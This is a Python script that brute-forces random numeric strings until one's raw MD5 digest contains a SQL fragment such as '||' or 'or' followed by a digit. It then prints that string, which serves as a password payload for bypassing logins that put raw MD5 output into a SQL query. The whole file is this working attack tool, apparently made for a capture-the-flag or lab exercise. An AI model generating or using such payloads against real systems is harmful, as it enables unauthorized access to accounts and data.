from hashlib import md5
import random
import string

random.seed()

i = 0
while(1):
    str_numbers = ''
    for j in range(4):
        x = random.randint(0, 2147483647)
        str_numbers = str_numbers + str(x)

    # print(str_numbers)
    if(i % 100000 == 0):
        print(i)
    i = i + 1

    result = md5(str_numbers.encode())
    # print(result)
    digest = result.digest()
    # print(digest)

    match1 = digest.find(b"'||'")
    match2 = digest.find(b"'OR'")
    match3 = digest.find(b"'Or'")
    match4 = digest.find(b"'oR'")
    match5 = digest.find(b"'or'")
    if match1 >= 0:
        index = match1 + 4
        # print(digest[index])
        if digest[index] > 48 and digest[index] < 58:
            print(str_numbers)
            print(digest)
            print("necessary characters found at index: " + str(match1))
            exit()
    if match2 >= 0:
        index = match2 + 4
        # print(digest[index])
        if digest[index] > 48 and digest[index] < 58:
            print(str_numbers)
            print(digest)
            print("necessary characters found at index: " + str(match2))
            exit()
    if match3 >= 0:
        index = match3 + 4
        # print(digest[index])
        if digest[index] > 48 and digest[index] < 58:
            print(str_numbers)
            print(digest)
            print("necessary characters found at index: " + str(match3))
            exit()
    if match4 >= 0:
        index = match4 + 4
        # print(digest[index])
        if digest[index] > 48 and digest[index] < 58:
            print(str_numbers)
            print(digest)
            print("necessary characters found at index: " + str(match4))
            exit()
    if match5 >= 0:
        index = match5 + 4
        # print(digest[index])
        if digest[index] > 48 and digest[index] < 58:
            print(str_numbers)
            print(digest)
            print("necessary characters found at index: " + str(match5))
            exit()
    